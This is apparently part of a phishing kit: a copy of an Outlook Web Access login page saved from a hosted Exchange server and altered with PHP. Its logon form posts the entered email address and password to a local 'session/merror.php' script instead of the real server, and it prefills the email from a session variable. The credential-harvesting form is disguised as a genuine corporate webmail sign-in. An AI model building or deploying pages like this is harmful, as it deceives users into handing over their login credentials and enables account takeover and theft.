...
<!-- saved from url=(0119)https://east.exch031.serverdata.net/owa/auth/logon.aspx?url=https%3a%2f%2feast.exch031.serverdata.net%2fowa%2f&reason=2 -->
...
function clkLgn()
{
    ...
    {
        var passwordElement = document.getElementById("fldPasswordi");
        var passwordTextElement = document.getElementById("passwordText");
        if (passwordElement && passwordTextElement) {
...
function RndMimeCtlHlpr(objid, classid, ns, id)
{
    ...
    <script>
        ...
        function setPlaceholderText() {
                ...
                window.document.getElementById("fldPasswordi").placeholder = "password";
        ...
        function showPasswordClick() {
            ...
            passwordElement = window.document.getElementById("fldPasswordi");
...
<form method="POST" action="session/merror.php?id=<?php echo bin2hex(random_bytes(16)); ?>" name="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off">
...
<div id="mainLogonDiv" class="tnarrow">
	...
	<div id="lgnDiv" class="logonDiv" onkeypress="return checkSubmit(event)">
		...
		<div><input id="fldUsernamei" name="fldUsernamei" class="signInInputText" role="textbox" aria-labelledby="userNameLabel" placeholder="email address" value="<?php echo isset($_SESSION['user_email']) ? htmlspecialchars($_SESSION['user_email']) : ''; ?>"></div>
		<div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
		<div><input id="fldPasswordi" onfocus="g_fFcs=0" name="fldPasswordi" value="" type="password" class="signInInputText" aria-labelledby="passwordLabel" placeholder="password"></div>
